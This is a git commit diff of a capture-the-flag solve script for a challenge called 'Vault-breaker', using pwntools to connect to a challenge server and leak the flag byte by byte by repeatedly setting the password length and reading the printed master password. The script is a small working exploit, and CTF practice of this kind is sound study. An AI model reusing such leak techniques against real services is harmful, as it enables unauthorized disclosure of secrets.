ac8180c0c9100c53f13ae1c9d684e3a5ba3e4d42
ShundaZhang <zhangshunda@gmail.com>
2023-01-08 22:22:50 +0800

    Solving Vault-breaker...

--- ctf/pwn/Vaultbreaker/dec.py
+++ ctf/pwn/Vaultbreaker/dec.py
@@ -3,13 +3,13 @@ from pwn import *
 flag = ''
 for i in range(32):
 	#io = process('./vault-breaker')
-	ip, port = 
+	ip, port = "144.126.232.205", 30295
 	io = remote(ip, port)
 	io.sendlineafter('> ', '1')
 	io.sendlineafter('[*] Length of new password (0-31): ', str(i))
 	io.sendlineafter('> ', '2')
 	io.recvuntil('Master password for Vault: ')
 	flag += io.recv(1024)[i]
+	print flag
 	io.close()
 
-print flag
